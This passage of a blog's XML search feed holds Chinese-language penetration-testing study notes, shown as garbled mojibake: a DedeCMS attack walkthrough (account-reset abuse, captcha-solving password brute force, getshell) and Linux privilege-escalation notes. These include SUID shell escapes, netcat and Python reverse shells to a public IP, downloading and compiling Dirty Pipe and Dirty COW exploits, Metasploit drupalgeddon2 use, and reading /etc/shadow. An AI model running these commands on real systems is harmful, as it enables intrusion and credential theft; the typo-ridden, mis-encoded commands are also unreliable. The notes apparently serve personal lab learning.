      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dedecmsæ¸—é€æµ‹è¯•</title>
    <link href="/2023/10/14/dedecms/"/>
    <url>/2023/10/14/dedecms/</url>
    
    <content type="html"><![CDATA[<h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.æŸ¥çœ‹robots.txtæ•æ„Ÿæ–‡ä»¶=&gt; å¾—åˆ°äº† test1 æ™®é€šè´¦å·<br><span class="hljs-number">2</span>.æˆ‘ä»¬åˆ©ç”¨ä»»æ„è´¦å·é‡ç½®æ¼æ´ å‘ç°äº† test1 test2 test3 test3 hejun3<br><span class="hljs-number">3</span>.é€šè¿‡ä¸ªäººç©ºé—´å‘ç°äº† åå°çš„è´¦å·å°±æ˜¯hejunï¼Œ<br><span class="hljs-number">4</span>.ç°åœ¨é—®é¢˜æ˜¯å¦‚ä½•æ‰¾åˆ°åå°ç™»å½•åœ°å€?æˆ‘ä»¬ç°åœ¨æ‰¾åˆ°äº†åå°ç™»é™†åœ°å€ä¸º hejunwebxxe<br><span class="hljs-number">5</span>.ä½¿ç”¨å¯†ç çˆ†ç ´ =&gt;éœ€è¦è¯†åˆ«éªŒè¯ç <br><span class="hljs-number">6</span>.ä½¿ç”¨BPæ’ä»¶è‡ªåŠ¨è¿›è¡Œå¼±å£ä»¤çˆ†ç ´(å®‰è£…å¥½éªŒè¯ç è¯†åˆ«å·¥å…·)<br><span class="hljs-number">7</span>.ä½¿ç”¨å¯†ç ç ´è§£ å¯†ç ä¸ºadmin888<br><span class="hljs-number">8</span>.æˆåŠŸè¿›å…¥åå° å‡†å¤‡getshell =&gt; æ–‡ä»¶ä¸Šä¼ å™¨<br></code></pre></td></tr></table></figure><h3 id="xiapaoå®‰è£…"><a href="#xiapaoå®‰è£…" class="headerlink" title="xiapaoå®‰è£…"></a>xiapaoå®‰è£…</h3><h4 id="é¦–å…ˆè¿›è¡Œpipæ›´æ–°"><a href="#é¦–å…ˆè¿›è¡Œpipæ›´æ–°" class="headerlink" title="é¦–å…ˆè¿›è¡Œpipæ›´æ–°"></a>é¦–å…ˆè¿›è¡Œpipæ›´æ–°</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">python -m pip install --upgrade pip<br>python -m pip install requests<br></code></pre></td></tr></table></figure><h4 id="ä¸‹ä¸€æ­¥å®‰è£…muggle-ocr"><a href="#ä¸‹ä¸€æ­¥å®‰è£…muggle-ocr" class="headerlink" title="ä¸‹ä¸€æ­¥å®‰è£…muggle-ocr"></a>ä¸‹ä¸€æ­¥å®‰è£…muggle-ocr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//blog.csdn.net/fendouwhy/article/details/126957008</span><br></code></pre></td></tr></table></figure><h4 id="å®‰è£…opencv-python"><a href="#å®‰è£…opencv-python" class="headerlink" title="å®‰è£…opencv-python"></a>å®‰è£…opencv-python</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pip install -i https:<span class="hljs-comment">//pypi.douban.com/simple/ pip install opencv-python==4.3.0.38</span><br></code></pre></td></tr></table></figure><p><img src="/image/3.png" alt="3"></p><h4 id="å®‰è£…é•œåƒ"><a href="#å®‰è£…é•œåƒ" class="headerlink" title="å®‰è£…é•œåƒ"></a>å®‰è£…é•œåƒ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">python -m pip install ddddocr -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-comment">// æ³¨æ„pythonç‰ˆæœ¬è¦å°äºç­‰äº3.6</span><br><span class="hljs-comment">// ç‰ˆæœ¬å¤§å…¨ https://registry.npmmirror.com/binary.html?path=python/</span><br></code></pre></td></tr></table></figure><h4 id="å®‰è£…headless"><a href="#å®‰è£…headless" class="headerlink" title="å®‰è£…headless"></a>å®‰è£…headless</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pip3 install opencv_python_headless-<span class="hljs-number">3.4</span>.<span class="hljs-number">18.65</span>-cp36-abi3-win_amd64.whl<br><span class="hljs-comment">//https://blog.csdn.net/yuan2019035055/article/details/128908284</span><br></code></pre></td></tr></table></figure><h2 id="ç”¨åˆ°çš„æ•™ç¨‹"><a href="#ç”¨åˆ°çš„æ•™ç¨‹" class="headerlink" title="ç”¨åˆ°çš„æ•™ç¨‹"></a>ç”¨åˆ°çš„æ•™ç¨‹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.yii666.com<span class="hljs-regexp">/blog/</span><span class="hljs-number">2567</span>.html<br>https:<span class="hljs-regexp">//</span>www.wangan.com<span class="hljs-regexp">/p/</span><span class="hljs-number">7</span>fy7f629aa58f9be<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fendouwhy/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">126957008</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒé™æå‡linux</title>
    <link href="/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/"/>
    <url>/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83linux/</url>
    
    <content type="html"><![CDATA[<h3 id="linuxææƒ"><a href="#linuxææƒ" class="headerlink" title="linuxææƒ"></a>linuxææƒ</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">å…ˆä¿¡æ¯æ”¶é›†ï¼Œæ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼ŒEXPä¿¡æ¯ï¼ŒIP</span><span class="hljs-string">,</span><span class="hljs-comment">ç«¯å£ã€‚</span><br><span class="hljs-comment">ä¿¡æ¯æ”¶é›†</span><br><span class="hljs-comment">ç³»ç»Ÿè‡ªå¸¦è§„åˆ™</span><span class="hljs-literal">--</span><span class="hljs-comment">SUID</span><br><span class="hljs-comment">æ¼æ´ææƒä¸€ä¸€é€šè¿‡ç¬¬ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†</span><br><span class="hljs-comment">å…¶ä»–çš„ä¸å®‰å…¨é…ç½®</span><br><span class="hljs-comment">ç¯å¢ƒå˜é‡é…åˆSUID</span><br><span class="hljs-comment">å®šæ—¶ä»»åŠ¡ææƒ</span><br><span class="hljs-literal">---</span><span class="hljs-comment">tar å‹ç¼©é…ç½®ä¸å®‰å…¨</span><br><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">æ€ä¹ˆå‡ºç°çš„/å‡ºç°çš„åœºæ™¯</span> <span class="hljs-literal">---</span> <span class="hljs-comment">å®šæ—¶ä»»åŠ¡ï¼Œå®šæ—¶è¿è¡Œçš„è„šæœ¬ä¸­ã€‚å­˜åœ¨tarå‹ç¼©é…ç½®ä¸å®‰å…¨ã€‚è¿™ç§è„šæœ¬å¸¸è§äºè¿ç»´å®šæ—¶å¤‡ä»½2</span><span class="hljs-string">.</span><span class="hljs-comment">åŸç†/(æ ¹æ®åŸç†)æ€ä¹ˆåˆ©ç”¨çš„</span><br><span class="hljs-literal">---</span> <span class="hljs-comment">åˆ©ç”¨çš„tarä¸­éœ€è¦å‹ç¼©æ‰€æœ‰æ–‡ä»¶ åœ¨å‹ç¼©å‘½ä»¤æœ«å°¾å¤„å­˜åœ¨* å·é€šé…ç¬¦åŒ¹é…æ‰€æœ‰æ–‡ä»¶</span><br><span class="hljs-literal">--</span> <span class="hljs-comment">åˆ›å»ºtarç›¸åº”çš„ä»¥å‘½ä»¤å‚æ•°å‘½åçš„æ–‡ä»¶ï¼Œä»¥åŠåˆ©ç”¨(å‘½ä»¤å‚æ•°æ‰§è¡Œåˆ©ç”¨) Aè„šæœ¬(æˆ‘ä»¬è‡ªå·±å†™çš„</span><br><span class="hljs-comment">3</span><span class="hljs-string">.</span> <span class="hljs-comment">cp /bin/bash /tmp/aaa/bash; chmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /tmp/bash</span><br><span class="hljs-comment">SUID</span><br><span class="hljs-comment">4</span><span class="hljs-string">.</span><span class="hljs-comment">dhmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">s /user/bin/find</span><br><span class="hljs-comment">5</span><span class="hljs-string">.</span><span class="hljs-comment">åå¼¹shell</span><span class="hljs-literal">--</span><span class="hljs-comment">ncä¸‹è½½æœ¨é©¬ wget:</span> <span class="hljs-literal">----</span> <span class="hljs-comment">æ‰§è¡Œ</span><br><span class="hljs-literal">-</span><span class="hljs-comment">æ–‡ä»¶æƒé™é…ç½®ä¸å®‰å…¨</span><br></code></pre></td></tr></table></figure><h5 id="å¾€ä¸Šæ»‘"><a href="#å¾€ä¸Šæ»‘" class="headerlink" title="å¾€ä¸Šæ»‘"></a>å¾€ä¸Šæ»‘</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// Shift+PgUppause</span><br></code></pre></td></tr></table></figure><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">curl ifconfig.me å¯è§è‡ªå·±IP<br><br>*ä¸€ä¸ªç»¼åˆç±»æ¢é’ˆ: https:<span class="hljs-comment">//github.com/liamg/traitor (ä¸Šä¼ åç›´æ¥è¿è¡Œå³å¯)</span><br>ä¸ªè‡ªåŠ¨åŒ–ææƒ: https:<span class="hljs-comment">//github.com/Alessandroz/BeRoot(éœ€è¦pyç¯å¢ƒ)</span><br>*ä¿¡æ¯æ”¶é›†: https:<span class="hljs-comment">//github.com/rebootuser/LinEnum(å‡ºç³»ç»Ÿä¿¡æ¯)</span><br>*ä¿¡æ¯æ”¶é›†: https:<span class="hljs-comment">//github.com/mzdt-/linux-exploit-suggester (å‡ºEXPä¿¡æ¯)</span><br>æ¼æ´æ¢é’ˆ: https:<span class="hljs-comment">//github.com/sleventyeleven/inuxprivchecker(éœ€è¦pyç¯å¢ƒ)</span><br>*æ¼æ´æ¢é’ˆ: https:<span class="hljs-comment">//github,com/jondonas/1inux-exploit-suggester-2</span><br>è¿›åˆ¶æ–‡ä»¶ææƒæŸ¥è¯¢:<br>Linux: https:<span class="hljs-comment">//gtfobins.github.io/</span><br>windows:https:<span class="hljs-comment">//1o1bas-project.github.io/</span><br>set payload php/meter--/reverse--<br></code></pre></td></tr></table></figure><h3 id="SUIDææƒ"><a href="#SUIDææƒ" class="headerlink" title="SUIDææƒ"></a>SUIDææƒ</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åŸç†æ˜¯ä»€ä¹ˆ?</span><br><span class="hljs-title function_ invoke__">SUID</span> (set User ID) æ˜¯ä¸€ç§ç‰¹æ®Šçš„æƒé™è®¾ç½®ï¼Œ<br>ç”¨äºåœ¨æ‰§è¡Œç¨‹åºæ—¶å°†æœ‰æ•ˆç”¨æˆ·<span class="hljs-title function_ invoke__">ID</span> (UID) ä¸´æ—¶æ›´æ”¹ä¸ºç¨‹åºæ–‡ä»¶æ‰€æœ‰è€…çš„UID<br><br>root suid-&gt;find<br><br><span class="hljs-title function_ invoke__">boy</span> (è¿ç»´äººå‘˜) <span class="hljs-title function_ invoke__">find</span> (root)<br><br><span class="hljs-comment">// æ¼æ´æˆå› : chmod u+sç»™äºˆäº†suid u-såˆ é™¤äº†suid</span><br>å¦‚: chmod u+s find<br>ä½¿ç¨‹åºåœ¨è¿è¡Œä¸­å—åˆ°äº†suid rootæƒé™çš„æ‰§è¡Œè¿‡ç¨‹å¯¼è‡´<br><br><span class="hljs-comment">// ææƒè¿‡ç¨‹: æ¢é’ˆæ˜¯å¦æœ‰SUID(æ‰‹å·¥æˆ–è„šæœ¬)-ç‰¹å®šSUIDåˆ©ç”¨-</span><br></code></pre></td></tr></table></figure><h4 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h4><h6 id="æ‰‹å·¥"><a href="#æ‰‹å·¥" class="headerlink" title="æ‰‹å·¥"></a>æ‰‹å·¥</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ‰‹å·¥å‘½ä»¤æ¢é’ˆå®‰å…¨:</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">print</span> <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br>find / -user root -perm -<span class="hljs-number">4000</span> -exec <span class="hljs-number">1</span>s -<span class="hljs-number">1</span>db &#123;&#125; \;<br></code></pre></td></tr></table></figure><h6 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// è„šæœ¬é¡¹ç›®æ¢é’ˆå®‰å…¨:</span><br>LinEnum.sh traitor Tinuxprivchecker<br></code></pre></td></tr></table></figure><h4 id="suidåˆ©ç”¨"><a href="#suidåˆ©ç”¨" class="headerlink" title="suidåˆ©ç”¨"></a>suidåˆ©ç”¨</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å‚è€ƒåˆ©ç”¨ï¼š</span><br>https:<span class="hljs-comment">//gtfobins.github.io/</span><br>https:<span class="hljs-comment">//pentestlab.blog/2017/09/25/suid-executables/</span><br></code></pre></td></tr></table></figure><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">nmap -V<br>nmap --interactive<br>nmap&gt; !sh<br>sh-<span class="hljs-number">3.2</span><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514232723.png" alt="å¾®ä¿¡æˆªå›¾_20230514232723"></p><h6 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">vim.tiny /etc shadow<br>vim.tiny<br><span class="hljs-comment"># Press ESC key</span><br>:set she11=/bin/sh<br>:she11<br></code></pre></td></tr></table></figure><h6 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">chmod u+x /usr/bin/find  <span class="hljs-comment">//èµ‹äºˆfindçš„rootæƒé™</span><br><br>touch pentestTab<br>find pentestlab -exec whoami \; <span class="hljs-comment">//å¯ä»¥çœ‹è§ä¸ºrootæƒé™</span><br>----<br>find pentestlab -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<span class="hljs-comment">//æ‰§è¡Œåå¼¹å‘½ä»¤</span><br>----<br>netcat <span class="hljs-number">192.1681</span>.<span class="hljs-number">189</span> <span class="hljs-number">5555</span><br>id<br>cat /etc/shadow<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514231952.png" alt="å¾®ä¿¡æˆªå›¾_20230514231952"></p><h6 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="More"><a href="#More" class="headerlink" title="More"></a>More</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h4 id="ä¸Šçº¿"><a href="#ä¸Šçº¿" class="headerlink" title="ä¸Šçº¿"></a>ä¸Šçº¿</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">touch yeye<br>find yeye -exec whoami \;<br>shell ç”Ÿæˆç½‘å€: https:<span class="hljs-comment">//forum.ywhack.com/shell.php</span><br><br>åˆ©ç”¨NCåå¼¹:<br>find yeye -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<br>netcat xx.xx.xx.xx <span class="hljs-number">5555</span><br>  <br>åˆ©ç”¨Pythonåå¼¹:<br>find yeye -exec python -c <span class="hljs-string">&#x27;import</span><br><span class="hljs-string">socket ,subprocess ,os :s=socket ,socket(socket,AF_INET,socket ,SOCK STREAM) :s , connect((&quot;47 .94.236.117&quot; 7777));os ,dup2(s ,fieno() , 0) ;os ,dup2(s ,fileno() ,1);os ,dup2(s ,fileno() ,2);p=slbprocess .ca11([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;<br><br>nc -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><h3 id="æ¼æ´ææƒ"><a href="#æ¼æ´ææƒ" class="headerlink" title="æ¼æ´ææƒ"></a>æ¼æ´ææƒ</h3><h4 id="æ™®é€šEXP"><a href="#æ™®é€šEXP" class="headerlink" title="æ™®é€šEXP"></a>æ™®é€šEXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ææƒè¿‡ç¨‹: è¿æ¥-è·å–å¯åˆ©ç”¨æ¼æ´-ä¸‹è½½æˆ–ä¸Šä¼ EXP-ç¼–è¯‘EXP-ç»™æƒé™æ‰§è¡Œ-GG</span><br>æ¢é’ˆé¡¹ç›®: BeRoot linux-exploit-suggester linux-exploit-suggester2<br>  <br>zip xxx make<br>.c gcc <span class="hljs-number">45010</span>.c -o exp<br>chmod +x exp<br>./exp<br>id<br><span class="hljs-comment">// é€šè¿‡æ¢é’ˆç»“æœ---&gt;ä¸‹è½½å¯¹åº”expè„šæœ¬---ã€‹ç¼–è¯‘ (.c/makefile) /è¿è¡Œ</span><br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514235112.png" alt="å¾®ä¿¡æˆªå›¾_20230514235112"></p><h4 id="è„ç‰›ææƒ-CVE-2016-5195"><a href="#è„ç‰›ææƒ-CVE-2016-5195" class="headerlink" title="è„ç‰›ææƒ(CVE-2016-5195)"></a>è„ç‰›ææƒ(CVE-2016-5195)</h4><h6 id="lampiaoé¶åœºå¤ç°"><a href="#lampiaoé¶åœºå¤ç°" class="headerlink" title="lampiaoé¶åœºå¤ç°"></a>lampiaoé¶åœºå¤ç°</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// è„ç‰›ææƒ(CVE-2016-5195)</span><br>å†…æ ¸ææƒæ•´ä¸ªè¿‡ç¨‹: (linux-exploit-suggesterè·å–ä¿¡æ¯å“¦)<br>å†…æ ¸æ¼æ´ææƒè¿‡ç¨‹: å¯»å¯ç”¨-ä¸‹exp-ä¸Š/tmp-ç¼–è¯‘exp-æ‰§è¡Œ(æ— æƒé™ç”¨chmod)<br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">46.0</span>/<span class="hljs-number">24</span><br>nmap -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">46.144</span><br>search drupal<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">unix</span>/<span class="hljs-title">webapp</span>/<span class="hljs-title">drupal_drupalgeddon2</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhost</span> 192.168,46.144<br><span class="hljs-title">set</span> <span class="hljs-title">rport</span> 1898<br><span class="hljs-title">run</span><br>===è„ç‰›ææƒ===<br><span class="hljs-title">upload</span> /<span class="hljs-title">root</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> /<span class="hljs-title">tmp</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span><br><span class="hljs-title">g</span>++ -<span class="hljs-title">Wall</span> -<span class="hljs-title">pedantic</span> -<span class="hljs-title">O2</span> -<span class="hljs-title">std</span>=<span class="hljs-title">c</span>++11 -<span class="hljs-title">pthread</span> -<span class="hljs-title">o</span> <span class="hljs-title">dcow</span> <span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> -<span class="hljs-title">lutil</span><br><span class="hljs-title">python</span> -<span class="hljs-title">c</span> &#x27;<span class="hljs-title">import</span> <span class="hljs-title">pty</span>; pty.<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">./dcow</span><br><span class="hljs-string">su root</span><br></code></pre></td></tr></table></figure><h4 id="è„ç®¡ææƒ-CVE-2022-0847"><a href="#è„ç®¡ææƒ-CVE-2022-0847" class="headerlink" title="è„ç®¡ææƒ(CVE-2022-0847)"></a>è„ç®¡ææƒ(CVE-2022-0847)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æ–¹æ³• åŠ«æŒ[SUID](https:<span class="hljs-comment">//so.csdn.net/so/search?q=SUID&amp;spm=1001.2101.3001.7020)æ–‡ä»¶/root</span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•ä¸€ï¼šåŠ«æŒ<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dirty Pipe(CVE-2022-0847)<br>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102<br>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ <span class="hljs-built_in">uname</span> -srm<br><br>wget https://haxx.in/files/dirtypipez.c<br>gcc -std=c99 dirtypipez.c -o dirtypipez<br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br>./dirtypipez /usr/bin/su  <span class="hljs-comment">#ä»»ä½•å…·ä½“suidæƒé™çš„æ–‡ä»¶å‡å¯</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šå¤å†™&#x2F;etc&#x2F;passwd</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-string">./compile.sh</span>               <br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-keyword">ls</span><br>compile.sh  exploit  exploit.c  LICENSE.txt  README.md<br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ <span class="hljs-string">./exploit</span>   <br>Backing up <span class="hljs-string">/etc/passwd</span> to <span class="hljs-string">/tmp/passwd.bak</span> <span class="hljs-string">...</span><br>Setting root password to <span class="hljs-string">&quot;aaron&quot;</span><span class="hljs-string">...</span><br>                                                                                                                                          <br>â”Œâ”€â”€<span class="hljs-params">(kaliã‰¿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>â””â”€$ su<br>Password: <br><span class="hljs-comment"># id</span><br>uid=0<span class="hljs-params">(root)</span> gid=0<span class="hljs-params">(root)</span> groups=0<span class="hljs-params">(root)</span>,4<span class="hljs-params">(adm)</span>,20<span class="hljs-params">(dialout)</span>,119<span class="hljs-params">(wireshark)</span>,142<span class="hljs-params">(kaboxer)</span><br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">è„šæœ¬è¿è¡Œ  bash Dirty-<span class="hljs-built_in">Pipe</span>.sh<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230515141911.png" 